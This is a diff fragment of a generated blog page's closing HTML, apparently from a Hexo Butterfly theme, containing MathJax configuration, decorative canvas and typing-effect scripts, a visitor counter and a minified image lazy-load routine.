+            //- // Four font extension packages (optional)
+            //- 'mathjax-bbm-extension': '[mathjax]/../@mathjax/mathjax-bbm-font-extension',
+            //- 'mathjax-bboldx-extension': '[mathjax]/../@mathjax/mathjax-bboldx-font-extension',
+            //- 'mathjax-dsfont-extension': '[mathjax]/../@mathjax/mathjax-dsfont-font-extension',
+            'mathjax-mhchem-extension': '[mathjax]/../@mathjax/mathjax-mhchem-font-extension'
+          }
+        },
+        output: {
+          font: 'mathjax-newcm',
+        },
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          tags: 'none',
+          packages: {
+            '[+]': [
+              'mhchem'
+            ]
+          }
+        },
+        chtml: {
+          scale: 1.1
+        },
+        options: {
+          enableMenu: true,
+          menuOptions: {
+            settings: {
+              enrich: false  // Turn off Braille and voice narration text automatic generation
+            }
+          },
+          renderActions: {
+            findScript: [10, doc => {
+              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+                const display = !!node.type.match(/; *mode=display/)
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+                const text = document.createTextNode('')
+                node.parentNode.replaceChild(text, node)
+                math.start = {node: text, delim: '', n: 0}
+                math.end = {node: text, delim: '', n: 0}
+                doc.math.push(math)
+              }
+            }, '']
+          }
+        }
+      }
+
+      const script = document.createElement('script')
+      script.src = 'https://cdn.jsdelivr.net/npm/mathjax@4.0.0/tex-mml-chtml.min.js'
+      script.id = 'MathJax-script'
+      script.async = true
+      document.head.appendChild(script)
+    } else {
+      MathJax.startup.document.state(0)
+      MathJax.texReset()
+      MathJax.typesetPromise()
+    }
+  }
+
+  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
+  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
+})()</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div>
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z\d\-\.\+]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(t.test(e.href)||r.test(e.href))&&(e.href=a.dataset.original)})});</script><script>(r=>{r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,o=r.imageLazyLoadSetting.preloadRatio||1,d=i();function i(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=i());for(var e,n=0;n<d.length;n++)0<=(e=(e=d[n]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*o||document.documentElement.clientHeight*o)&&(()=>{var t,e,a,o,i=d[n];e=function(){d=d.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,o=t.getAttribute("data-original"),a.onload=function(){t.src=o,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=o},t.src!==o&&(a.src=o)))})()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)})(this);</script></body></html>
